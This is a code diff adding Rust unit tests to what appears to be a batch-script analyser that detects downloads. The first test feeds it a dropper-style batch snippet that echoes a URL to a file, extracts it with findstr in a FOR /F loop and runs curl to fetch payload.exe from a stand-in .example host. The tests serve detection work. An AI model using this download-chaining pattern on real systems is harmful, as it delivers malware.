@@ -3676,6 +3676,29 @@ for /f "tokens=* delims=" %%U in ('findstr /i "https://" web.txt') do curl -o pa
     }
 
     #[test]
+    fn for_f_findstr_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo https://for-f-findstr-multi.example/payload.exe>first.txt
+echo noise>second.txt
+for /f "tokens=* delims=" %%U in ('findstr /i "https://" first.txt second.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file findstr source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_sort_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>urls.txt
@@ -14455,6 +14478,32 @@ mod synth_tests {
         assert_eq!(
             lines,
             vec!["https://findstr-file.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_findstr_reads_multiple_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://findstr-multi.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"findstr /i "https://" first.txt second.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://findstr-multi.example/payload.exe".to_string()]
         );
     }
 
